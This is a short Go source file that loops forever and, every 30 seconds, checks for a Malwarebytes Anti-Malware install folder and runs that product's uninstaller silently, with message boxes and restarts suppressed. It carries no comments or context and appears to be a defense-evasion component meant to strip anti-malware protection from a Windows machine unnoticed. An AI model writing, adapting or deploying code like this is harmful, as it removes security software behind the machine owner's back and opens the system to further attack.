package main

import (
	"os/exec"
	"time"
	"os"
)

func main() {
	for {
		time.Sleep(30 * time.Second)		
		
		mal := exec.Command("cmd", "/C", "C:\\Program Files\\Malwarebytes\\Anti-Malware\\unins000.exe", "/verysilent", "/suppressmsgboxes", "/norestart")

		if _, err := os.Stat("C:\\Program Files\\Malwarebytes\\Anti-Malware\\"); err == nil {
 			mal.Run()
		}
		

	}
}